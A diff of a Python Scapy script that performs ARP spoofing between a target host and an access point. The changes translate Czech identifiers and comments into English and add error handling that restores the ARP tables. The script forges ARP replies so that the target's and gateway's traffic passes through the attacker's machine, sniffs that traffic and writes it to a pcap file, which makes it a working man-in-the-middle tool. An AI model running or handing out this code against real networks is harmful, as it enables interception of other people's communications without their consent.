@@ -1,19 +1,19 @@
 from scapy.all import ARP, wrpcap, sendp as s, Ether, get_if_hwaddr, conf, AsyncSniffer # Přidány importy pro HW MAC a Sniffing
 import time
 
-# --- Hlavní funkce --- #
-def spoof(target_ip, target_mac, router_ip, router_mac):
+# --- Main function --- #
+def spoof(target_ip, target_mac, ap_ip, ap_mac):
     # Získání vlastní MAC adresy pro správné směrování trafficu k nám
-    vlastni_mac = get_if_hwaddr(conf.iface)
+    own_mac = get_if_hwaddr(conf.iface)
 
     # Vytvoření falešného ARP paketu pro oběť
     # OPRAVA: Přidáno hwsrc=vlastni_mac, aby oběť posílala data útočníkovi
-    arp_obet = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, hwsrc=vlastni_mac, pdst=target_ip, hwdst=target_mac)
-    arp_router = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, hwsrc=vlastni_mac, pdst=router_ip, hwdst=router_mac)
+    arp_target = Ether(dst=target_mac) / ARP(op=2, psrc=ap_ip, hwsrc=own_mac, pdst=target_ip, hwdst=target_mac)
+    arp_ap = Ether(dst=ap_mac) / ARP(op=2, psrc=target_ip, hwsrc=own_mac, pdst=ap_ip, hwdst=ap_mac)
 
     # Restore tabulek
-    arp_obet_restore = Ether(dst=target_mac) / ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
-    arp_router_restore = Ether(dst=router_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)
+    target_restore = Ether(dst=target_mac) / ARP(op=2, psrc=ap_ip, hwsrc=ap_mac, pdst=target_ip, hwdst=target_mac)
+    ap_restore = Ether(dst=ap_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=ap_ip, hwdst=ap_mac)
 
     # Funkce pro výpis zachycených paketů do konzole
     def packet_callback(pkt):
@@ -25,10 +25,10 @@ def spoof(target_ip, target_mac, router_ip, router_mac):
     sniffer.start()
 
     try: 
-        print(f"Sending spoofed ARP packets to {target_ip} and {router_ip}... (Press Ctrl+C to stop)")
+        print(f"Sending spoofed ARP packets to {target_ip} and {ap_ip}... (Press Ctrl+C to stop)")
         while True:
-            s(arp_obet, verbose=False)
-            s(arp_router, verbose=False)
+            s(arp_target, verbose=False)
+            s(arp_ap, verbose=False)
             
             time.sleep(2)
 
@@ -39,8 +39,8 @@ def spoof(target_ip, target_mac, router_ip, router_mac):
         captured_packets = sniffer.stop()
 
         # Odeslání správných ARP paketů pro obnovení sítě
-        s(arp_obet_restore, verbose=False, count=5)
-        s(arp_router_restore, verbose=False, count=5)
+        s(target_restore, verbose=False, count=5)
+        s(ap_restore, verbose=False, count=5)
 
         print(f"Network restored. Captured {len(captured_packets)} packets.")
         
@@ -50,3 +50,9 @@ def spoof(target_ip, target_mac, router_ip, router_mac):
             print("Communication saved to capture.pcap")
         
         print("Program terminated.")
+    except Exception:
+        print("\n[!] An error occurred. Stopping the spoofing...")
+        sniffer.stop()
+        s(target_restore, verbose=False, count=5)
+        s(ap_restore, verbose=False, count=5)
+        print("Network restored.")
